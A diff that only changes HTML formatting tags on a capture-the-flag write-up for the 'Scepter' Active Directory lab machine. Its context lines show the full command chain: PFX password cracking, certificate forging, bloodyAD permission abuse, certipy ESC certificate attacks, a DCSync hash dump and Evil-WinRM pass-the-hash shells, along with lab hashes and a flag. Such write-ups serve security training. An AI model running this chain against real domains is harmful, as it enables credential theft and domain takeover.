@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Scepter is a Hard difficulty Windows AD machine exposing <strong>NFS</strong> and <strong>SMB</strong> shares. The attack begins with mounting a publicly accessible NFS helpdesk share containing PFX certificate files. After cracking the PFX password and forging a new certificate, authentication to AD is performed via certipy. The escalation chains through <strong>BloodHound AD path abuse</strong>, <strong>ESC certificate attacks</strong>, and ultimately a <strong>DCSync</strong> to dump the Administrator hash.</p>
+      <p>Scepter is a Hard difficulty Windows AD machine exposing <code>NFS</code> and <code>SMB</code> shares. The attack begins with mounting a publicly accessible NFS helpdesk share containing PFX certificate files. After cracking the PFX password and forging a new certificate, authentication to AD is performed via certipy. The escalation chains through <code>BloodHound AD path abuse</code>, <code>ESC certificate attacks</code>, and ultimately a <code>DCSync</code> to dump the Administrator hash.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <div class="code-block"><pre><code>nmap -p- 10.129.6.202               
@@ -363,7 +363,7 @@ drwxrwxrwt 17 root   root     400 May  5 22:24 ..
       <p>I convert the PFX file into a hash format that John the Ripper can process for offline cracking.</p>
       <div class="code-block"><pre><code>sudo pfx2john helpdesk/lewis.pfx | tee -a hashtocrack 
 lewis.pfx:$pfxng$256$32$2048$8$2ae7b9f39c9e4fb3$30820c8e308206fa06092a864886f70d010706a08206eb308206e7020100308206e006092a864886f70d010701305f06092a864886f70d01050d3052303106092a864886f70d01050c30240410c914118aca0894b9e681d52eaf4c624002020800300c06082a864886f70d02090500301d060960864801650304012a0410614c34dd66906b1a7499d153ea6ffffa80820670a26e8d00ddf0335677033b383e165baa35dbb5460a023962c84f73ee6d0060011a34e8b01a5a902d9141e0a968408567c1a7372898dd738ee31750331ed9b43eb28e2f3a67e31e565d8240f7982d094b06872c1aa9ca312dfb85fd82bc9fcc5fd51998cc60e51bef78ec7f71e69ea7371e12257190bc94843291a...</code></pre></div>
-      <p>I crack the extracted hash using <strong>John the Ripper</strong> with the <code>rockyou.txt</code> wordlist.</p>
+      <p>I crack the extracted hash using <code>John the Ripper</code> with the <code>rockyou.txt</code> wordlist.</p>
       <div class="code-block"><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashtocrack
 Using default input encoding: UTF-8
 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
@@ -375,7 +375,7 @@ newpassword      (lewis.pfx)
 1g 0:00:00:00 DONE (2025-05-05 22:36) 5.263g/s 26947p/s 26947c/s 26947C/s Liverpool..babygrl
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed.</code></pre></div>
-      <p>With the PFX password known, I create a new certificate using the key material from the helpdesk share and authenticate to AD using <strong>certipy</strong>.</p>
+      <p>With the PFX password known, I create a new certificate using the key material from the helpdesk share and authenticate to AD using <code>certipy</code>.</p>
       <div class="code-block"><pre><code>sudo openssl pkcs12 -export -out baker.pfx -inkey /tmp/helpdesk/baker.key -in /tmp/helpdesk/baker.crt -passout pass:newpassword
 Enter pass phrase for /tmp/helpdesk/baker.key:</code></pre></div>
       <p>I authenticate using the forged PFX certificate to extract the user's NTLM hash or obtain a session.</p>
@@ -410,7 +410,7 @@ SMB         10.129.62.114   445    DC01             [+] scepter.htb\a.carter:Tes
       <p>With a.carter's access, I grant GenericAll permissions over the Staff OU and modify <code>d.baker</code>'s mail attribute to impersonate user <code>h.brown</code> via ESC certificate abuse.</p>
       <div class="code-block"><pre><code>bloodyAD --host &quot;10.129.62.114&quot; -d &quot;scepter.htb&quot; -u a.carter -p &quot;Test123&quot; add genericAll &quot;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&quot; a.carter                                        
 [+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB</code></pre></div>
-      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
+      <p>I use <code>bloodyAD</code> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>bloodyAD -d scepter.htb -u a.carter -p &#x27;Test123&#x27; --host dc01.scepter.htb --dc-ip 10.129.62.114 set object d.baker mail -v h.brown@scepter.htb                         
 [+] d.baker&#x27;s mail has been updated</code></pre></div>
       <h3 class="writeup-sub-title">Certificate Request for h.brown</h3>
@@ -430,7 +430,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved BloodHound data to &#x27;20250508023112_Certipy.zip&#x27;. Drag and drop the file into the BloodHound GUI from @ly4k
 [*] Saved text output to &#x27;20250508023112_Certipy.txt&#x27;
 [*] Saved JSON output to &#x27;20250508023112_Certipy.json&#x27;</code></pre></div>
-      <p>I use <strong>certipy req</strong> to request a certificate from the CA using the identified vulnerable template. By specifying the Administrator's UPN (User Principal Name) in the certificate's Subject Alternative Name (SAN), I create a certificate that the domain trusts as belonging to the Administrator — even though it was requested by a different user. This is the core of <strong>ESC-type certificate abuse</strong> attacks.</p>
+      <p>I use <code>certipy req</code> to request a certificate from the CA using the identified vulnerable template. By specifying the Administrator's UPN (User Principal Name) in the certificate's Subject Alternative Name (SAN), I create a certificate that the domain trusts as belonging to the Administrator — even though it was requested by a different user. This is the core of <code>ESC-type certificate abuse</code> attacks.</p>
       <div class="code-block"><pre><code>certipy req -username &quot;d.baker@scepter.htb&quot; -hashes aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca &#x27;scepter-DC01-CA&#x27; -template &#x27;StaffAccessCertificate&#x27;
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -452,7 +452,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved credential cache to &#x27;h.brown.ccache&#x27;
 [*] Trying to retrieve NT hash for &#x27;h.brown&#x27;
 [*] Got hash for &#x27;h.brown@scepter.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Scepter]
 └─$ KRB5CCNAME=h.brown.ccache evil-winrm -i dc01.scepter.htb -r scepter.htb -u h.brown</code></pre></div>
       <p>I inspect the configuration file for stored credentials or sensitive information.</p>
@@ -481,7 +481,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [domain_realm]
         .scepter.htb = SCEPTER.HTB
         scepter.htb = SCEPTER.HTB</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>KRB5CCNAME=h.brown.ccache evil-winrm -i dc01.scepter.htb -r scepter.htb -u h.brown
                                         
 Evil-WinRM shell v3.7
@@ -494,7 +494,7 @@ Warning: User is not needed for Kerberos auth. Ticket will be used
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\h.brown\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\h.brown\Desktop&gt; ls
 
 
@@ -511,10 +511,10 @@ Mode                LastWriteTime         Length Name
       <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">556d7282428d785ff39cfb14bd6eba25</code></div>
       <h2 class="writeup-section-title">Privilege Escalation: DCSync Attack</h2>
       <h3 class="writeup-sub-title">Modifying Mail Attributes for p.adams</h3>
-      <p>User <code>h.brown</code> is a member of the <strong>CMS Global Group</strong>, granting write rights over <code>p.adams</code>. I modify the mail attribute to prepare for another certificate request.</p>
+      <p>User <code>h.brown</code> is a member of the <code>CMS Global Group</code>, granting write rights over <code>p.adams</code>. I modify the mail attribute to prepare for another certificate request.</p>
       <div class="code-block"><pre><code>bloodyAD -k ccache=h.brown.ccache --dc-ip 10.129.243.90 --host dc01.scepter.htb -d scepter.htb  set object p.adams altSecurityIdentities -v &#x27;X509:&lt;RFC822&gt;h.brown@scepter.htb&#x27;                      
 [+] p.adams&#x27;s altSecurityIdentities has been updated</code></pre></div>
-      <p>I use <strong>certipy</strong> to authenticate with the forged certificate and extract <code>p.adams</code>'s NT hash. Certipy performs PKINIT (Public Key Cryptography for Initial Authentication) against the KDC, which returns a TGT containing the user's PAC. From this, the NT hash can be extracted using the U2U (User-to-User) Kerberos extension — a technique known as <strong>UnPAC-the-Hash</strong>.</p>
+      <p>I use <code>certipy</code> to authenticate with the forged certificate and extract <code>p.adams</code>'s NT hash. Certipy performs PKINIT (Public Key Cryptography for Initial Authentication) against the KDC, which returns a TGT containing the user's PAC. From this, the NT hash can be extracted using the U2U (User-to-User) Kerberos extension — a technique known as <code>UnPAC-the-Hash</code>.</p>
       <div class="code-block"><pre><code>certipy auth -pfx d.baker.pfx -username p.adams -domain scepter.htb -dc-ip 10.129.243.90 -debug
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -526,7 +526,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for &#x27;p.adams&#x27;
 [*] Got hash for &#x27;p.adams@scepter.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0</code></pre></div>
       <h3 class="writeup-sub-title">DCSync</h3>
-      <p>With <code>p.adams</code>'s credentials, I perform a <strong>DCSync attack</strong> using <code>secretsdump.py</code>. DCSync mimics a domain controller's replication behavior to request all user password hashes from the target DC.</p>
+      <p>With <code>p.adams</code>'s credentials, I perform a <code>DCSync attack</code> using <code>secretsdump.py</code>. DCSync mimics a domain controller's replication behavior to request all user password hashes from the target DC.</p>
       <div class="code-block"><pre><code>KRB5CCNAME=p.adams.ccache secretsdump.py -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0&#x27; -just-dc p.adams@scepter.htb
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -587,7 +587,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
 
 
